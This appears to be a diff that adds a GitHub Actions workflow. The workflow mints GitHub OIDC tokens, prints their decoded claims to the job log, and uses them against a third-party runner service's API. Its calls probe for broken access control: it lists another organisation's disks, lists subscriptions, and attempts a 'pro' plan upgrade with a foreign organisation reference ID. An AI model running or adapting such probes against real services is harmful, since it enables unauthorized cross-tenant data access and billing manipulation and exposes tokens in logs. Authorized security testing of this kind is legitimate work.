@@ -1,0 +1,33 @@
+name: oidc-probe
+on: push
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint-and-call
+        run: |
+          set -u
+          echo "REQ_URL_SCHEME_HOST=$(echo "$ACTIONS_ID_TOKEN_REQUEST_URL" | sed 's/?.*//')"
+          T1=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=starsling-disks" | tr -d '\n' | sed 's/.*"value":"\([^"]*\)".*/\1/')
+          echo "TOKEN_AUD_STARSLING_LEN=${#T1}"
+          echo "CLAIMS_AUD_STARSLING=$(echo "$T1" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | tr -d '\n')"
+          T2=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | tr -d '\n' | sed 's/.*"value":"\([^"]*\)".*/\1/')
+          echo "CLAIMS_DEFAULT_AUD=$(echo "$T2" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | tr -d '\n')"
+          probe() {
+            echo "=== $1"
+            code=$(curl -sS -m 20 -o /tmp/body -w '%{http_code}' -H "Authorization: Bearer $2" "$3")
+            echo "HTTP $code"
+            head -c 1500 /tmp/body; echo
+          }
+          probe whoami_aud_starslingdisks "$T1" https://runners.starsling.dev/api/whoami
+          probe whoami_default_aud "$T2" https://runners.starsling.dev/api/whoami
+          probe disks_org_self "$T1" "https://runners.starsling.dev/api/disks?org=tundefund0-gif"
+          probe disks_org_starslingdev "$T1" "https://runners.starsling.dev/api/disks?org=starslingdev"
+          probe presets "$T1" https://runners.starsling.dev/api/disks/presets
+          probe sub_list "$T1" https://runners.starsling.dev/api/auth/subscription/list
+          echo "=== sub_upgrade_ref_org_123"
+          code=$(curl -sS -m 25 -o /tmp/up -w '%{http_code}' -H "Authorization: Bearer $T1" -H 'Content-Type: application/json' -d '{"plan":"pro","referenceId":"org_123","customerType":"organization","seats":1}' https://runners.starsling.dev/api/auth/subscription/upgrade)
+          echo "HTTP $code"; head -c 1200 /tmp/up; echo
